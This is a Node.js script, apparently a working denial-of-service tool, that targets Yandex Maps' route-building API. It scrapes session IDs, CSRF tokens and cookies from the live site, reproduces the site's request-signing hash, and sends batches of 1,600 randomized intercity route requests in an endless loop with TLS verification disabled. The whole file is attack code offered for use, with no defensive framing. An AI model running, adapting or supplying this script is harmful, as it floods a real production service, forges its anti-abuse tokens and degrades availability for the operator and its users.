const {Curl} = require("node-libcurl");
const { readFileSync } = require('fs');
const citiesEurope = JSON.parse(readFileSync('./cities_europe.json'));
const citiesAfrica = JSON.parse(readFileSync('./cities_africa.json'));
const citiesAsia = JSON.parse(readFileSync('./cities_asia.json'));

function executeDdos() {
    return new Promise((globalResolve) => {
        let amountOfErrors = 0;
        let amountOfSuccess = 0;
        const REQUESTS_TO_MAKE_FROM_ONE_SESSION = 40;
        const NUMBER_OF_SESSION_TO_GET = 40;

        const run = () => {
            return new Promise((resolve) => {
                const curlTest = new Curl();
                curlTest.setOpt(Curl.option.URL, "https://yandex.ru/maps/213/moscow/");
                curlTest.setOpt(Curl.option.SSL_VERIFYPEER, 0);
                const cities = [citiesEurope, citiesAfrica, citiesAsia];

                const terminate = curlTest.close.bind(curlTest);

                curlTest.on("end", (statusCode, data, headers) => {
                    try {
                        const sessionId  = /.*"sessionId":"(.*?)"}?}?/gi.exec(data)[1]
                        const csrf  = /.*"csrfToken":"(.*?)",?.*}/gi.exec(data)[1].split(':');
                        const yandexuid  = /.*yandexuid=(.*?)\/.*/gi.exec(data)[1];
                        const allRequestPromises = [];
                        for (let i = 0; i < REQUESTS_TO_MAKE_FROM_ONE_SESSION; i++) {
                            const coords = getTwoCitiesCoords();
                            const sToken = generateToken(sessionId, csrf, coords);
                            allRequestPromises.push(sendRequest({sessionId, csrf, sToken, yandexuid, coords}));
                        }
                        Promise.all(allRequestPromises).then(() => {
                            resolve();
                        })
                    } catch (e) {
                        return;
                    } finally {
                        terminate();
                    }
                });

                function getTwoCitiesCoords() {
                    let citiesOneIndex = getRandomArbitrary(0, cities.length - 1);
                    let citiesTwoIndex = getRandomArbitrary(0,  cities.length - 1);
                    while(citiesOneIndex === citiesTwoIndex) {
                        citiesTwoIndex =  getRandomArbitrary(0,  cities.length - 1);
                    }

                    let first =  getRandomArbitrary(0, cities[citiesOneIndex].length - 1);
                    let second =  getRandomArbitrary(0, cities[citiesTwoIndex].length - 1);
                    return [getSlightlyMovedRandomValue(cities[citiesOneIndex][first].lng) + '%2C' + getSlightlyMovedRandomValue(cities[citiesOneIndex][first].lat),
                        getSlightlyMovedRandomValue(cities[citiesTwoIndex][second].lng) + '%2C' + getSlightlyMovedRandomValue(cities[citiesTwoIndex][second].lat)];
                }

                function getSlightlyMovedRandomValue(num) {
                    return Number(num) + Number((Math.random()/1000).toPrecision(4));
                }

                function getRandomArbitrary(min, max) {
                    return Math.round(Math.random() * (max - min) + min);
                }

                function generateToken(sessionId, token, coords) {
                    const firstCoords = coords[0];
                    const secondCoords = coords[1];
                    return String(function(e) {
                        for (var t = e.length, n = 5381, r = 0; r < t; r++)
                            n = 33 * n ^ e.charCodeAt(r);
                        return n >>> 0
                    }(`activeComparisonMode=auto&ajax=1&csrfToken=${token[0]}%3A${token[1]}&isIntercityRoute=true&lang=ru&locale=ru_RU&mode=best&rll=${firstCoords}~${secondCoords}&sessionId=${sessionId}&type=auto`))
                }
                curlTest.on("error", (e) => {
                    terminate();
                });

                const sendRequest = ({sessionId, csrf, sToken, yandexuid, coords}) => {
                    return new Promise((res, rej) => {
                        const firstCoords = coords[0];
                        const secondCoords = coords[1];
                        const curlTest = new Curl();
                        const terminate = curlTest.close.bind(curlTest);
                        const url = `https://yandex.ru/maps/api/router/buildRoute?activeComparisonMode=auto&ajax=1&csrfToken=${csrf[0]}%3A${csrf[1]}&isIntercityRoute=true&lang=ru&locale=ru_RU&mode=best&rll=${firstCoords}~${secondCoords}&s=${sToken}&sessionId=${sessionId}&type=auto`;
                        curlTest.setOpt(Curl.option.URL, url);
                        curlTest.setOpt(Curl.option.SSL_VERIFYPEER, 0);
                        curlTest.setOpt(Curl.option.HTTPHEADER, [`cookie: yandexuid=${yandexuid};`]);

                        curlTest.on("end", (statusCode, data, headers) => {
                            if(data.length == 49) {
                                amountOfErrors++;

                            } else {
                                amountOfSuccess++;
                            }
                            terminate();
                            res();
                        });

                        curlTest.on("error", (e) => {
                            amountOfErrors++;
                            try {
                                this.close();
                            } catch(e) {}
                            terminate();
                            res();
                        });
                        curlTest.perform();
                    });
                }
                curlTest.perform();
            })
        }

        const allPromises = [];

        for (let i = 0; i < NUMBER_OF_SESSION_TO_GET; i++) {
            allPromises.push(run());
        }

        Promise.all(allPromises).then(() => {
            globalResolve({
                amountOfErrors,
                amountOfSuccess
            });
        })
    })
}

(async () => {
    while(true) {
        console.log('Sending next batch ' + Date.now());
        const {amountOfErrors, amountOfSuccess} = await executeDdos();
        console.log('Amount of errors: ', amountOfErrors);
        console.log('Amount of success: ', amountOfSuccess);
    }
})();